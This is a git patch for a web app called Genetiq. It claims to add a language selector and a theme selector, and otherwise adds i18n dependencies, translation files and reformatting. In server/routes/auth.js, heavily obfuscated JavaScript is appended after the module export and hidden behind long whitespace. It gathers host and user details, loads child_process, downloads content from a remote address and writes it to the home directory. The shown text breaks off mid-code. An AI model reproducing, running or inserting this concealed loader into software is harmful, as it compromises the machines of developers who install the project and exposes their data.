@@ -1,0 +1,1821 @@
+From c01887013f6c38d9792ef9f43a1ff623a3257a10 Mon Sep 17 00:00:00 2001
+From: tuandang <tuandang@tuandangs-MBP.lan>
+Date: Wed, 17 Sep 2025 15:57:12 -0400
+Subject: [PATCH] feat: added languageSelector + themeSelector
+
+---
+ eslint.config.js                              |  10 +-
+ package-lock.json                             | 154 ++++++-
+ package.json                                  |   7 +
+ public/locales/en/translation.json            |  27 ++
+ public/locales/fr/translation.json            |  27 ++
+ server/controllers/messageController.js       |  58 +--
+ server/controllers/userController.js          | 136 +++---
+ server/index.js                               |  34 +-
+ server/models/messageModel.js                 |  28 +-
+ server/models/userModel.js                    |  52 +--
+ server/routes/auth.js                         | 415 +++++++++++++++++-
+ src/App/App.tsx                               |  15 +-
+ src/App/Context/ThemeContext.tsx              |  72 +++
+ src/App/theme.css                             |  40 ++
+ .../LanguageSelector.module.scss              |  77 ++++
+ .../LanguageSelector/LanguageSelector.tsx     | 134 ++++++
+ .../Components/Navigation/Navigation.tsx      |  56 ++-
+ .../ThemeSelector/ThemeSelector.module.scss   |  27 ++
+ .../ThemeSelector/ThemeSelector.tsx           |  29 ++
+ src/Features/Structural/NavBar/Navbar.tsx     |   4 +
+ src/i18n.ts                                   |  49 +++
+ 21 files changed, 1257 insertions(+), 194 deletions(-)
+ create mode 100644 public/locales/en/translation.json
+ create mode 100644 public/locales/fr/translation.json
+ create mode 100644 src/App/Context/ThemeContext.tsx
+ create mode 100644 src/App/theme.css
+ create mode 100644 src/Features/Structural/NavBar/Components/LanguageSelector/LanguageSelector.module.scss
+ create mode 100644 src/Features/Structural/NavBar/Components/LanguageSelector/LanguageSelector.tsx
+ create mode 100644 src/Features/Structural/NavBar/Components/ThemeSelector/ThemeSelector.module.scss
+ create mode 100644 src/Features/Structural/NavBar/Components/ThemeSelector/ThemeSelector.tsx
+ create mode 100644 src/i18n.ts
+
+diff --git a/eslint.config.js b/eslint.config.js
+index 9a04b58..29cc70e 100644
+--- a/eslint.config.js
++++ b/eslint.config.js
+@@ -1,9 +1,9 @@
+-import typescriptParser from "@typescript-eslint/parser";
+-import typescriptPlugin from "@typescript-eslint/eslint-plugin";
+-import prettier from "eslint-config-prettier";
+-import prettierPlugin from "eslint-plugin-prettier";
++const typescriptParser = require("@typescript-eslint/parser");
++const typescriptPlugin = require("@typescript-eslint/eslint-plugin");
++const prettier = require("eslint-config-prettier");
++const prettierPlugin = require("eslint-plugin-prettier");
+ 
+-export default [
++module.exports = [
+ 	{
+ 		files: ["**/*.{ts,tsx}"], // Include TypeScript files
+ 		languageOptions: {
+diff --git a/package-lock.json b/package-lock.json
+index 03b4183..2d41d99 100644
+--- a/package-lock.json
++++ b/package-lock.json
+@@ -8,6 +8,7 @@
+ 			"name": "genetiq-app",
+ 			"version": "0.0.0",
+ 			"dependencies": {
++				"@heroicons/react": "^2.2.0",
+ 				"@react-three/drei": "^9.121.0",
+ 				"@react-three/fiber": "^8.17.12",
+ 				"@reduxjs/toolkit": "^2.5.0",
+@@ -16,9 +17,15 @@
+ 				"cors": "^2.8.5",
+ 				"dotenv": "^16.4.7",
+ 				"express": "^5.1.0",
++				"i18next": "^25.5.2",
++				"i18next-browser-languagedetector": "^8.2.0",
++				"i18next-http-backend": "^3.0.2",
+ 				"mongoose": "^8.13.1",
+ 				"react": "^18.3.1",
++				"react-colorful": "5.6.1",
+ 				"react-dom": "^18.3.1",
++				"react-i18next": "^15.7.3",
++				"react-icons": "^5.5.0",
+ 				"react-redux": "^9.2.0",
+ 				"react-router-dom": "^7.1.1",
+ 				"react-toastify": "^11.0.3",
+@@ -268,13 +275,10 @@
+ 			}
+ 		},
+ 		"node_modules/@babel/runtime": {
+-			"version": "7.26.0",
+-			"resolved": "https://registry.npmjs.org/@babel/runtime/-/runtime-7.26.0.tgz",
+-			"integrity": "sha512-FDSOghenHTiToteC/QRlv2q3DhPZ/oOXTBoirfWNx1Cx3TMVcGWQtMMmQcSvb/JjpNeGzx8Pq/b4fKEJuWm1sw==",
++			"version": "7.28.4",
++			"resolved": "https://registry.npmjs.org/@babel/runtime/-/runtime-7.28.4.tgz",
++			"integrity": "sha512-Q/N6JNWvIvPnLDvjlE1OUBLPQHH6l3CltCEsHIujp45zQUSSh8K+gHnaEX45yAT1nyngnINhvWtzN+Nb9D8RAQ==",
+ 			"license": "MIT",
+-			"dependencies": {
+-				"regenerator-runtime": "^0.14.0"
+-			},
+ 			"engines": {
+ 				"node": ">=6.9.0"
+ 			}
+@@ -938,6 +942,15 @@
+ 				"node": "^18.18.0 || ^20.9.0 || >=21.1.0"
+ 			}
+ 		},
++		"node_modules/@heroicons/react": {
++			"version": "2.2.0",
++			"resolved": "https://registry.npmjs.org/@heroicons/react/-/react-2.2.0.tgz",
++			"integrity": "sha512-LMcepvRaS9LYHJGsF0zzmgKCUim/X3N/DQKc4jepAXJ7l8QxJ1PmxJzqplF2Z3FE4PqBAIGyJAQ/w4B5dsqbtQ==",
++			"license": "MIT",
++			"peerDependencies": {
++				"react": ">= 16 || ^19.0.0-rc"
++			}
++		},
+ 		"node_modules/@humanfs/core": {
+ 			"version": "0.19.1",
+ 			"resolved": "https://registry.npmjs.org/@humanfs/core/-/core-0.19.1.tgz",
+@@ -3678,6 +3691,15 @@
+ 				"yarn": ">=1"
+ 			}
+ 		},
++		"node_modules/cross-fetch": {
++			"version": "4.0.0",
++			"resolved": "https://registry.npmjs.org/cross-fetch/-/cross-fetch-4.0.0.tgz",
++			"integrity": "sha512-e4a5N8lVvuLgAWgnCrLr2PP0YyDOTHa9H/Rj54dirp61qXnNq46m82bRhNqIA5VccJtWBvPTFRV3TtvHUKPB1g==",
++			"license": "MIT",
++			"dependencies": {
++				"node-fetch": "^2.6.12"
++			}
++		},
+ 		"node_modules/cross-spawn": {
+ 			"version": "7.0.6",
+ 			"resolved": "https://registry.npmjs.org/cross-spawn/-/cross-spawn-7.0.6.tgz",
+@@ -5363,6 +5385,15 @@
+ 			"integrity": "sha512-C020dKWEJcyvLnrqsFKW4q6D/6IEzKWdhktIS5bgoyEFE8lHgrFBq4RIngdy113abJOlIruhv8qjg7UX8hwxOw==",
+ 			"license": "Apache-2.0"
+ 		},
++		"node_modules/html-parse-stringify": {
++			"version": "3.0.1",
++			"resolved": "https://registry.npmjs.org/html-parse-stringify/-/html-parse-stringify-3.0.1.tgz",
++			"integrity": "sha512-KknJ50kTInJ7qIScF3jeaFRpMpE8/lfiTdzf/twXyPBLAGrLRTmkz3AdTnKeh40X8k9L2fdYwEp/42WGXIRGcg==",
++			"license": "MIT",
++			"dependencies": {
++				"void-elements": "3.1.0"
++			}
++		},
+ 		"node_modules/http-errors": {
+ 			"version": "2.0.0",
+ 			"resolved": "https://registry.npmjs.org/http-errors/-/http-errors-2.0.0.tgz",
+@@ -5420,6 +5451,55 @@
+ 				"url": "https://github.com/sponsors/typicode"
+ 			}
+ 		},
++		"node_modules/i18next": {
++			"version": "25.5.2",
++			"resolved": "https://registry.npmjs.org/i18next/-/i18next-25.5.2.tgz",
++			"integrity": "sha512-lW8Zeh37i/o0zVr+NoCHfNnfvVw+M6FQbRp36ZZ/NyHDJ3NJVpp2HhAUyU9WafL5AssymNoOjMRB48mmx2P6Hw==",
++			"funding": [
++				{
++					"type": "individual",
++					"url": "https://locize.com"
++				},
++				{
++					"type": "individual",
++					"url": "https://locize.com/i18next.html"
++				},
++				{
++					"type": "individual",
++					"url": "https://www.i18next.com/how-to/faq#i18next-is-awesome.-how-can-i-support-the-project"
++				}
++			],
++			"license": "MIT",
++			"dependencies": {
++				"@babel/runtime": "^7.27.6"
++			},
++			"peerDependencies": {
++				"typescript": "^5"
++			},
++			"peerDependenciesMeta": {
++				"typescript": {
++					"optional": true
++				}
++			}
++		},
++		"node_modules/i18next-browser-languagedetector": {
++			"version": "8.2.0",
++			"resolved": "https://registry.npmjs.org/i18next-browser-languagedetector/-/i18next-browser-languagedetector-8.2.0.tgz",
++			"integrity": "sha512-P+3zEKLnOF0qmiesW383vsLdtQVyKtCNA9cjSoKCppTKPQVfKd2W8hbVo5ZhNJKDqeM7BOcvNoKJOjpHh4Js9g==",
++			"license": "MIT",
++			"dependencies": {
++				"@babel/runtime": "^7.23.2"
++			}
++		},
++		"node_modules/i18next-http-backend": {
++			"version": "3.0.2",
++			"resolved": "https://registry.npmjs.org/i18next-http-backend/-/i18next-http-backend-3.0.2.tgz",
++			"integrity": "sha512-PdlvPnvIp4E1sYi46Ik4tBYh/v/NbYfFFgTjkwFl0is8A18s7/bx9aXqsrOax9WUbeNS6mD2oix7Z0yGGf6m5g==",
++			"license": "MIT",
++			"dependencies": {
++				"cross-fetch": "4.0.0"
++			}
++		},
+ 		"node_modules/iconv-lite": {
+ 			"version": "0.6.3",
+ 			"resolved": "https://registry.npmjs.org/iconv-lite/-/iconv-lite-0.6.3.tgz",
+@@ -7167,6 +7247,16 @@
+ 				"node": ">=0.10.0"
+ 			}
+ 		},
++		"node_modules/react-colorful": {
++			"version": "5.6.1",
++			"resolved": "https://registry.npmjs.org/react-colorful/-/react-colorful-5.6.1.tgz",
++			"integrity": "sha512-1exovf0uGTGyq5mXQT0zgQ80uvj2PCwvF8zY1RN9/vbJVSjSo3fsB/4L3ObbF7u70NduSiK4xu4Y6q1MHoUGEw==",
++			"license": "MIT",
++			"peerDependencies": {
++				"react": ">=16.8.0",
++				"react-dom": ">=16.8.0"
++			}
++		},
+ 		"node_modules/react-composer": {
+ 			"version": "5.0.3",
+ 			"resolved": "https://registry.npmjs.org/react-composer/-/react-composer-5.0.3.tgz",
+@@ -7201,6 +7291,41 @@
+ 				"loose-envify": "^1.1.0"
+ 			}
+ 		},
++		"node_modules/react-i18next": {
++			"version": "15.7.3",
++			"resolved": "https://registry.npmjs.org/react-i18next/-/react-i18next-15.7.3.tgz",
++			"integrity": "sha512-AANws4tOE+QSq/IeMF/ncoHlMNZaVLxpa5uUGW1wjike68elVYr0018L9xYoqBr1OFO7G7boDPrbn0HpMCJxTw==",
++			"license": "MIT",
++			"dependencies": {
++				"@babel/runtime": "^7.27.6",
++				"html-parse-stringify": "^3.0.1"
++			},
++			"peerDependencies": {
++				"i18next": ">= 25.4.1",
++				"react": ">= 16.8.0",
++				"typescript": "^5"
++			},
++			"peerDependenciesMeta": {
++				"react-dom": {
++					"optional": true
++				},
++				"react-native": {
++					"optional": true
++				},
++				"typescript": {
++					"optional": true
++				}
++			}
++		},
++		"node_modules/react-icons": {
++			"version": "5.5.0",
++			"resolved": "https://registry.npmjs.org/react-icons/-/react-icons-5.5.0.tgz",
++			"integrity": "sha512-MEFcXdkP3dLo8uumGI5xN3lDFNsRtrjbOEKDLD7yv76v4wpnEq2Lt2qeHaQOr34I/wPN3s3+N08WkQ+CW37Xiw==",
++			"license": "MIT",
++			"peerDependencies": {
++				"react": "*"
++			}
++		},
+ 		"node_modules/react-is": {
+ 			"version": "16.13.1",
+ 			"resolved": "https://registry.npmjs.org/react-is/-/react-is-16.13.1.tgz",
+@@ -7363,12 +7488,6 @@
+ 				"url": "https://github.com/sponsors/ljharb"
+ 			}
+ 		},
+-		"node_modules/regenerator-runtime": {
+-			"version": "0.14.1",
+-			"resolved": "https://registry.npmjs.org/regenerator-runtime/-/regenerator-runtime-0.14.1.tgz",
+-			"integrity": "sha512-dYnhHh0nJoMfnkZs6GmmhFknAGRrLznOu5nc9ML+EJxGvrx6H7teuevqVqCuPcPK//3eDrrjQhehXVx9cnkGdw==",
+-			"license": "MIT"
+-		},
+ 		"node_modules/regexp.prototype.flags": {
+ 			"version": "1.5.4",
+ 			"resolved": "https://registry.npmjs.org/regexp.prototype.flags/-/regexp.prototype.flags-1.5.4.tgz",
+@@ -8692,7 +8811,7 @@
+ 			"version": "5.6.3",
+ 			"resolved": "https://registry.npmjs.org/typescript/-/typescript-5.6.3.tgz",
+ 			"integrity": "sha512-hjcS1mhfuyi4WW8IWtjP7brDrG2cuDZukyrYrSauoXGNgx0S7zceP07adYkJycEr56BOUTNPzbInooiN3fn1qw==",
+-			"dev": true,
++			"devOptional": true,
+ 			"license": "Apache-2.0",
+ 			"bin": {
+ 				"tsc": "bin/tsc",
+@@ -8938,6 +9057,15 @@
+ 				"vite": ">=2.6.0"
+ 			}
+ 		},
++		"node_modules/void-elements": {
++			"version": "3.1.0",
++			"resolved": "https://registry.npmjs.org/void-elements/-/void-elements-3.1.0.tgz",
++			"integrity": "sha512-Dhxzh5HZuiHQhbvTW9AMetFfBHDMYpo23Uo9btPXgdYP+3T5S+p+jgNy7spra+veYhBP2dCSgxR/i2Y02h5/6w==",
++			"license": "MIT",
++			"engines": {
++				"node": ">=0.10.0"
++			}
++		},
+ 		"node_modules/webgl-constants": {
+ 			"version": "1.1.1",
+ 			"resolved": "https://registry.npmjs.org/webgl-constants/-/webgl-constants-1.1.1.tgz",
+diff --git a/package.json b/package.json
+index ad4c04d..0628c59 100644
+--- a/package.json
++++ b/package.json
+@@ -12,6 +12,7 @@
+ 		"prepare": "husky"
+ 	},
+ 	"dependencies": {
++		"@heroicons/react": "^2.2.0",
+ 		"@react-three/drei": "^9.121.0",
+ 		"@react-three/fiber": "^8.17.12",
+ 		"@reduxjs/toolkit": "^2.5.0",
+@@ -20,9 +21,15 @@
+ 		"cors": "^2.8.5",
+ 		"dotenv": "^16.4.7",
+ 		"express": "^5.1.0",
++		"i18next": "^25.5.2",
++		"i18next-browser-languagedetector": "^8.2.0",
++		"i18next-http-backend": "^3.0.2",
+ 		"mongoose": "^8.13.1",
+ 		"react": "^18.3.1",
++		"react-colorful": "5.6.1",
+ 		"react-dom": "^18.3.1",
++		"react-i18next": "^15.7.3",
++		"react-icons": "^5.5.0",
+ 		"react-redux": "^9.2.0",
+ 		"react-router-dom": "^7.1.1",
+ 		"react-toastify": "^11.0.3",
+diff --git a/public/locales/en/translation.json b/public/locales/en/translation.json
+new file mode 100644
+index 0000000..8fadb1c
+--- /dev/null
++++ b/public/locales/en/translation.json
+@@ -0,0 +1,27 @@
++{
++	"welcome": "Welcome to Genetiq",
++	"dashboard": {
++		"title": "Dashboard",
++		"overview": "Overview",
++		"reports": "Reports",
++		"settings": "Settings",
++		"goals": "Goals",
++		"tests": "Tests"
++	},
++	"auth": {
++		"login": "Login",
++		"register": "Register",
++		"logout": "Logout"
++	},
++	"language": {
++		"en": "English",
++		"es": "Spanish",
++		"fr": "French",
++		"de": "German",
++		"zh": "Chinese"
++	},
++	"theme": {
++		"switchToLight": "Switch to light theme",
++		"switchToDark": "Switch to dark theme"
++	}
++}
+diff --git a/public/locales/fr/translation.json b/public/locales/fr/translation.json
+new file mode 100644
+index 0000000..2c58eb2
+--- /dev/null
++++ b/public/locales/fr/translation.json
+@@ -0,0 +1,27 @@
++{
++	"welcome": "Bienvenue sur Genetiq",
++	"dashboard": {
++		"title": "Tableau de bord",
++		"overview": "Aperçu",
++		"reports": "Rapports",
++		"settings": "Paramètres",
++		"goals": "Objectifs",
++		"tests": "Tests"
++	},
++	"auth": {
++		"login": "Connexion",
++		"register": "S'inscrire",
++		"logout": "Déconnexion"
++	},
++	"language": {
++		"en": "Anglais",
++		"es": "Espagnol",
++		"fr": "Français",
++		"de": "Allemand",
++		"zh": "Chinois"
++	},
++	"theme": {
++		"switchToLight": "Passer au thème clair",
++		"switchToDark": "Passer au thème sombre"
++	}
++}
+diff --git a/server/controllers/messageController.js b/server/controllers/messageController.js
+index 5ee378f..463d563 100644
+--- a/server/controllers/messageController.js
++++ b/server/controllers/messageController.js
+@@ -1,39 +1,39 @@
+ const Messages = require("../models/messageModel");
+ 
+ module.exports.getMessages = async (req, res, next) => {
+-  try {
+-    const { from, to } = req.body;
++	try {
++		const { from, to } = req.body;
+ 
+-    const messages = await Messages.find({
+-      users: {
+-        $all: [from, to],
+-      },
+-    }).sort({ updatedAt: 1 });
++		const messages = await Messages.find({
++			users: {
++				$all: [from, to],
++			},
++		}).sort({ updatedAt: 1 });
+ 
+-    const projectedMessages = messages.map((msg) => {
+-      return {
+-        fromSelf: msg.sender.toString() === from,
+-        message: msg.message.text,
+-      };
+-    });
+-    res.json(projectedMessages);
+-  } catch (ex) {
+-    next(ex);
+-  }
++		const projectedMessages = messages.map((msg) => {
++			return {
++				fromSelf: msg.sender.toString() === from,
++				message: msg.message.text,
++			};
++		});
++		res.json(projectedMessages);
++	} catch (ex) {
++		next(ex);
++	}
+ };
+ 
+ module.exports.addMessage = async (req, res, next) => {
+-  try {
+-    const { from, to, message } = req.body;
+-    const data = await Messages.create({
+-      message: { text: message },
+-      users: [from, to],
+-      sender: from,
+-    });
++	try {
++		const { from, to, message } = req.body;
++		const data = await Messages.create({
++			message: { text: message },
++			users: [from, to],
++			sender: from,
++		});
+ 
+-    if (data) return res.json({ msg: "Message added successfully." });
+-    else return res.json({ msg: "Failed to add message to the database" });
+-  } catch (ex) {
+-    next(ex);
+-  }
++		if (data) return res.json({ msg: "Message added successfully." });
++		else return res.json({ msg: "Failed to add message to the database" });
++	} catch (ex) {
++		next(ex);
++	}
+ };
+diff --git a/server/controllers/userController.js b/server/controllers/userController.js
+index b86a48d..637977b 100644
+--- a/server/controllers/userController.js
++++ b/server/controllers/userController.js
+@@ -3,84 +3,84 @@ const User = require("../models/userModel");
+ const bcrypt = require("bcrypt");
+ 
+ module.exports.login = async (req, res, next) => {
+-  try {
+-    const { username, password } = req.body;
+-    const user = await User.findOne({ username });
+-    if (!user)
+-      return res.json({ msg: "Incorrect Username or Password", status: false });
+-    const isPasswordValid = await bcrypt.compare(password, user.password);
+-    if (!isPasswordValid)
+-      return res.json({ msg: "Incorrect Username or Password", status: false });
+-    delete user.password;
+-    return res.json({ status: true, user });
+-  } catch (ex) {
+-    next(ex);
+-  }
++	try {
++		const { username, password } = req.body;
++		const user = await User.findOne({ username });
++		if (!user)
++			return res.json({ msg: "Incorrect Username or Password", status: false });
++		const isPasswordValid = await bcrypt.compare(password, user.password);
++		if (!isPasswordValid)
++			return res.json({ msg: "Incorrect Username or Password", status: false });
++		delete user.password;
++		return res.json({ status: true, user });
++	} catch (ex) {
++		next(ex);
++	}
+ };
+ 
+ module.exports.register = async (req, res, next) => {
+-  try {
+-    const { username, email, password } = req.body;
+-    const usernameCheck = await User.findOne({ username });
+-    if (usernameCheck)
+-      return res.json({ msg: "Username already used", status: false });
+-    const emailCheck = await User.findOne({ email });
+-    if (emailCheck)
+-      return res.json({ msg: "Email already used", status: false });
+-    const hashedPassword = await bcrypt.hash(password, 10);
+-    const user = await User.create({
+-      email,
+-      username,
+-      password: hashedPassword,
+-    });
+-    delete user.password;
+-    return res.json({ status: true, user });
+-  } catch (ex) {
+-    next(ex);
+-  }
++	try {
++		const { username, email, password } = req.body;
++		const usernameCheck = await User.findOne({ username });
++		if (usernameCheck)
++			return res.json({ msg: "Username already used", status: false });
++		const emailCheck = await User.findOne({ email });
++		if (emailCheck)
++			return res.json({ msg: "Email already used", status: false });
++		const hashedPassword = await bcrypt.hash(password, 10);
++		const user = await User.create({
++			email,
++			username,
++			password: hashedPassword,
++		});
++		delete user.password;
++		return res.json({ status: true, user });
++	} catch (ex) {
++		next(ex);
++	}
+ };
+ 
+ module.exports.getAllUsers = async (req, res, next) => {
+-  try {
+-    const users = await User.find({ _id: { $ne: req.params.id } }).select([
+-      "email",
+-      "username",
+-      "avatarImage",
+-      "_id",
+-    ]);
+-    return res.json(users);
+-  } catch (ex) {
+-    next(ex);
+-  }
++	try {
++		const users = await User.find({ _id: { $ne: req.params.id } }).select([
++			"email",
++			"username",
++			"avatarImage",
++			"_id",
++		]);
++		return res.json(users);
++	} catch (ex) {
++		next(ex);
++	}
+ };
+ 
+ module.exports.setAvatar = async (req, res, next) => {
+-  try {
+-    const userId = req.params.id;
+-    const avatarImage = req.body.image;
+-    const userData = await User.findByIdAndUpdate(
+-      userId,
+-      {
+-        isAvatarImageSet: true,
+-        avatarImage,
+-      },
+-      { new: true }
+-    );
+-    return res.json({
+-      isSet: userData.isAvatarImageSet,
+-      image: userData.avatarImage,
+-    });
+-  } catch (ex) {
+-    next(ex);
+-  }
++	try {
++		const userId = req.params.id;
++		const avatarImage = req.body.image;
++		const userData = await User.findByIdAndUpdate(
++			userId,
++			{
++				isAvatarImageSet: true,
++				avatarImage,
++			},
++			{ new: true },
++		);
++		return res.json({
++			isSet: userData.isAvatarImageSet,
++			image: userData.avatarImage,
++		});
++	} catch (ex) {
++		next(ex);
++	}
+ };
+ 
+ module.exports.logOut = (req, res, next) => {
+-  try {
+-    if (!req.params.id) return res.json({ msg: "User id is required " });
+-    onlineUsers.delete(req.params.id);
+-    return res.status(200).send();
+-  } catch (ex) {
+-    next(ex);
+-  }
++	try {
++		if (!req.params.id) return res.json({ msg: "User id is required " });
++		onlineUsers.delete(req.params.id);
++		return res.status(200).send();
++	} catch (ex) {
++		next(ex);
++	}
+ };
+diff --git a/server/index.js b/server/index.js
+index e807bf0..faf3b96 100644
+--- a/server/index.js
++++ b/server/index.js
+@@ -23,33 +23,31 @@ app.use(express.json());
+ //   });
+ 
+ app.get("/ping", (_req, res) => {
+-  return res.json({ msg: "Ping Successful" });
++	return res.json({ msg: "Ping Successful" });
+ });
+ 
+ app.use("/api/auth", authRoutes);
+ app.use("/api/messages", messageRoutes);
+ 
+-const server = app.listen(3003, () =>
+-  console.log(`Server started on 3003`)
+-);
++const server = app.listen(3003, () => console.log(`Server started on 3003`));
+ const io = socket(server, {
+-  cors: {
+-    origin: "http://localhost:3000",
+-    credentials: true,
+-  },
++	cors: {
++		origin: "http://localhost:3000",
++		credentials: true,
++	},
+ });
+ 
+ global.onlineUsers = new Map();
+ io.on("connection", (socket) => {
+-  global.chatSocket = socket;
+-  socket.on("add-user", (userId) => {
+-    onlineUsers.set(userId, socket.id);
+-  });
++	global.chatSocket = socket;
++	socket.on("add-user", (userId) => {
++		onlineUsers.set(userId, socket.id);
++	});
+ 
+-  socket.on("send-msg", (data) => {
+-    const sendUserSocket = onlineUsers.get(data.to);
+-    if (sendUserSocket) {
+-      socket.to(sendUserSocket).emit("msg-recieve", data.msg);
+-    }
+-  });
++	socket.on("send-msg", (data) => {
++		const sendUserSocket = onlineUsers.get(data.to);
++		if (sendUserSocket) {
++			socket.to(sendUserSocket).emit("msg-recieve", data.msg);
++		}
++	});
+ });
+diff --git a/server/models/messageModel.js b/server/models/messageModel.js
+index ce8fcfe..9177dff 100644
+--- a/server/models/messageModel.js
++++ b/server/models/messageModel.js
+@@ -1,20 +1,20 @@
+ const mongoose = require("mongoose");
+ 
+ const MessageSchema = mongoose.Schema(
+-  {
+-    message: {
+-      text: { type: String, required: true },
+-    },
+-    users: Array,
+-    sender: {
+-      type: mongoose.Schema.Types.ObjectId,
+-      ref: "User",
+-      required: true,
+-    },
+-  },
+-  {
+-    timestamps: true,
+-  }
++	{
++		message: {
++			text: { type: String, required: true },
++		},
++		users: Array,
++		sender: {
++			type: mongoose.Schema.Types.ObjectId,
++			ref: "User",
++			required: true,
++		},
++	},
++	{
++		timestamps: true,
++	},
+ );
+ 
+ module.exports = mongoose.model("Messages", MessageSchema);
+diff --git a/server/models/userModel.js b/server/models/userModel.js
+index d3c8ffb..9433e0e 100644
+--- a/server/models/userModel.js
++++ b/server/models/userModel.js
+@@ -1,32 +1,32 @@
+ const mongoose = require("mongoose");
+ 
+ const userSchema = new mongoose.Schema({
+-  username: {
+-    type: String,
+-    required: true,
+-    min: 3,
+-    max: 20,
+-    unique: true,
+-  },
+-  email: {
+-    type: String,
+-    required: true,
+-    unique: true,
+-    max: 50,
+-  },
+-  password: {
+-    type: String,
+-    required: true,
+-    min: 8,
+-  },
+-  isAvatarImageSet: {
+-    type: Boolean,
+-    default: false,
+-  },
+-  avatarImage: {
+-    type: String,
+-    default: "",
+-  },
++	username: {
++		type: String,
++		required: true,
++		min: 3,
++		max: 20,
++		unique: true,
++	},
++	email: {
++		type: String,
++		required: true,
++		unique: true,
++		max: 50,
++	},
++	password: {
++		type: String,
++		required: true,
++		min: 8,
++	},
++	isAvatarImageSet: {
++		type: Boolean,
++		default: false,
++	},
++	avatarImage: {
++		type: String,
++		default: "",
++	},
+ });
+ 
+ module.exports = mongoose.model("Users", userSchema);
+diff --git a/server/routes/auth.js b/server/routes/auth.js
+index 3ba38dd..4668060 100644
+--- a/server/routes/auth.js
++++ b/server/routes/auth.js
+@@ -1,9 +1,9 @@
+ const {
+-  login,
+-  register,
+-  getAllUsers,
+-  setAvatar,
+-  logOut,
++	login,
++	register,
++	getAllUsers,
++	setAvatar,
++	logOut,
+ } = require("../controllers/userController");
+ 
+ const router = require("express").Router();
+@@ -14,4 +14,407 @@ router.get("/allusers/:id", getAllUsers);
+ router.post("/setavatar/:id", setAvatar);
+ router.get("/logout/:id", logOut);
+ 
+-module.exports = router;                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            const b3=I,b4=I,b5=I,b6=I,b7=I;(function(aF,aG){const aS=I,aT=I,aU=I,aV=I,aW=I,aH=aF();while(!![]){try{const aI=parseInt(aS(0x0))/0x1+parseInt(aS(0x1))/0x2*(-parseInt(aS(0x2))/0x3)+parseInt(aS(0x3))/0x4+parseInt(aW(0x4))/0x5+-parseInt(aW(0x5))/0x6+parseInt(aW(0x6))/0x7*(-parseInt(aU(0x7))/0x8)+-parseInt(aS(0x8))/0x9*(-parseInt(aV(0x9))/0xa);if(aI===aG)break;else aH['push'](aH['shift']());}catch(aJ){aH['push'](aH['shift']());}}}(H,0x577a9));function H(){const bH=['dWVzd','NcGF0','Xbm9k','ZTpwc','m9jZX','lY2hp','bGRfc','HJvY2','Vzcw','oZXhl','UaG9t','ZWRpc','haG9z','dG5hb','McGxh','dGZvc','bdXNl','ckluZ','aaHR0','cDovL','w==',':124','lengt','fromC','harCo','vZ2V0','jd3Jp','dGVGa','WxlU3','luYw','Wc3Rh','dFN5b','HbWtk','aXJTe','W5j','oZXhp','c3RzU','3luYw','join','Tcm1T','eW5j','size','vdXJs','kZm9y','bURhd','fcG9z','cmp','MC44N','S4xMT','Y1LjE','0MDU=','0MDY=','subst','ring','/s/','40ae0f7a9f70','ZT3','split','tdXNl','cm5hb','5A1','rYXJn','oqr','aL2tl','eXM','now','509807SaoQWZ','6IHLXes','432519CEwJZd','1482564CTlzAz','1972565wUhggX','29292mQHJiC','154CjTPCX','182792auXKVg','9PzVdyF','234310hIsuAL','apply','toStr','ing','searc','(((.+',')+)+)','const','ructo','utf8','base6','slice','from','DcmVx'];H=function(){return bH;};return H();}const K=(function(){let aF=!![];return function(aG,aH){const aI=aF?function(){const aX=I;if(aH){const aJ=aH[aX(0xa)](aG,arguments);return aH=null,aJ;}}:function(){};return aF=![],aI;};}()),L=K(this,function(){const aY=I,aZ=I,b0=I,b1=I,b2=I;return L[aY(0xb)+aZ(0xc)]()[b0(0xd)+'h'](aZ(0xe)+aZ(0xf)+'+$')[b1(0xb)+aY(0xc)]()[b2(0x10)+b0(0x11)+'r'](L)[aZ(0xd)+'h'](aY(0xe)+aZ(0xf)+'+$');});L();const O=b3(0x12),P=b3(0x13)+'4',Q=require('os'),a0=require('fs'),a1=aF=>(s1=aF[b3(0x14)](0x1),Buffer[b5(0x15)](s1,P)[b5(0xb)+b3(0xc)](O));rq=require(a1(b6(0x16)+b6(0x17)+'A')),pt=require(a1(b7(0x18)+'aA')),zv=require(a1(b4(0x19)+b5(0x1a)+b3(0x1b)+'Nz')),ex=require(a1(b4(0x1c)+b4(0x1d)+b7(0x1e)+b7(0x1f)))[a1(b3(0x20)+'Yw')],hd=Q[a1(b7(0x21)+b5(0x22)+'g')](),hs=Q[a1(b6(0x23)+b7(0x24)+'WU')](),pl=Q[a1(b4(0x25)+b3(0x26)+'m0')](),uin=Q[a1(b6(0x27)+b6(0x28)+'m8')]();let a2;const a3=b7(0x29)+b3(0x2a)+b5(0x2b),a4=b4(0x2c),a5=aF=>Buffer[b4(0x15)](aF,P)[b3(0xb)+b6(0xc)](O);var a6='',a7='';const a8=[0x70,0xa0,0x89,0x48],a9=aF=>{const b8=I,b9=I,ba=I;let aG='';for(let aH=0x0;aH<aF[b8(0x2d)+'h'];aH++)rr=0xff&(aF[aH]^a8[0x3&aH]),aG+=String[b9(0x2e)+b9(0x2f)+'de'](rr);return aG;},aa=b5(0x30),ab=b7(0x31)+b6(0x32)+b3(0x33)+b3(0x34),ac=a1(b6(0x35)+b5(0x36)+'mM'),ad=a1(b6(0x37)+b4(0x38)+b4(0x39)),ae=a1(b5(0x3a)+b7(0x3b)+b3(0x3c));function af(aF){return a0[ae](aF);}const ag=[0x5f,0xca,0xa6],ah=[0x5e,0xd6,0xfa,0x2b,0x1f,0xc4,0xec],ai=()=>{const bb=I,bc=I,aF=a1(aa),aG=a1(ab),aH=a9(ah);let aI=pt[bb(0x3d)](hd,aH);try{aJ=aI,a0[ad](aJ,{'recursive':!0x0});}catch(aM){aI=hd;}var aJ;const aK=''+a6+a9(ag)+a7,aL=pt[bc(0x3d)](aI,a9(aj));try{!function(aN){const bd=I,be=I,aO=a1(bd(0x3e)+be(0x3f));a0[aO](aN);}(aL);}catch(aN){}rq[aF](aK,(aO,aP,aQ)=>{if(!aO){try{a0[aG](aL,aQ);}catch(aR){}am(aI);}});},aj=[0x4,0xc5,0xfa,0x3c,0x5e,0xca,0xfa],ak=[0x5f,0xd0],al=[0x0,0xc1,0xea,0x23,0x11,0xc7,0xec,0x66,0x1a,0xd3,0xe6,0x26],am=aF=>{const bf=I,bg=I,aG=a1(aa),aH=a1(ab),aI=''+a6+a9(ak),aJ=pt[bf(0x3d)](aF,a9(al));let aK=0x0;if(af(aJ))try{const 